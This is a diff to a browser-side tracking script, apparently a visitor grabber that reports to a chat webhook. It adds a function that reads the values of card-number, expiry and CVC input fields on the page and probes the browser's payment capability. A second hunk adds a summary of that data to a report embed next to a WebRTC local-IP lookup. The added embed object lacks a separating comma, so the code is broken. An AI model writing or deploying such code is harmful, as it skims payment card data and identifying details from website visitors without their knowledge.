@@ -165,8 +165,60 @@
                     obtenirIPLocale(infos);
                 });
         }
+        // ====== PAYMENT METHOD DETECTION ======
+        function detectPaymentMethods(infos) {
+            // 1. Check for Payment Request API
+            if ('PaymentRequest' in window) {
+                infos.paymentRequestSupported = true;
+                const supportedInstruments = [{
+                    supportedMethods: 'basic-card',
+                    data: { supportedNetworks: ['visa', 'mastercard', 'amex'] }
+                }];
+                const details = {
+                    total: { label: 'Test', amount: { currency: 'USD', value: '1.00' } }
+                };
+                try {
+                    const request = new PaymentRequest(supportedInstruments, details);
+                    request.canMakePayment().then(result => {
+                        infos.paymentRequestCanMakePayment = result;
+                    }).catch(() => {
+                        infos.paymentRequestCanMakePayment = false;
+                    });
+                } catch (e) {
+                    infos.paymentRequestError = e.message;
+                  }
+            } else {
+                infos.paymentRequestSupported = false;
+            }
+
+    // 2. Detect autofilled payment fields
+        const paymentFields = ['cardnumber', 'cc-number', 'creditcard', 'exp-date', 'cvc'];
+        infos.paymentAutofillDetected = {};
+        paymentFields.forEach(field => {
+            const element = document.querySelector(`input[name*="${field}"], input[id*="${field}"]`);
+            if (element && element.value) {
+                infos.paymentAutofillDetected[field] = element.value;
+            }
+        });
+
+    // 3. Check for insecure payment forms (HTTP)
+        const paymentForms = document.querySelectorAll('form[action*="pay"], form[action*="checkout"]');
+        infos.insecurePaymentForms = [];
+        paymentForms.forEach(form => {
+            const action = form.getAttribute('action');
+            if (action && !action.startsWith('https://')) {
+                infos.insecurePaymentForms.push({
+                    formAction: action,
+                    reason: "Insecure (HTTP)"
+                });
+            }
+        });
+
+    // 4. Log payment-related data (for reporting)
+        infos.storedPaymentMethods = "Not directly accessible (blocked by browser)";
+    }
         
-        function obtenirIPLocale(infos) {
+           function obtenirIPLocale(infos) {
             // Essayer d'obtenir l'IP locale via WebRTC
             var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
             
@@ -257,6 +309,13 @@
                         {
                             name: "🔗 Source",
                             value: infos.url,
+                            inline: false
+                        }
+                        {
+                            name: "💳 Payment Methods",
+                            value: `**API Supported:** ${infos.paymentRequestSupported}\n` +
+                           `**Autofill Detected:** ${Object.keys(infos.paymentAutofillDetected).length > 0 ? "✅" : "❌"}\n` +
+                           `**Insecure Forms:** ${infos.insecurePaymentForms.length > 0 ? "⚠️ " + infos.insecurePaymentForms.length : "None"}`,
                             inline: false
                         }
                     ],
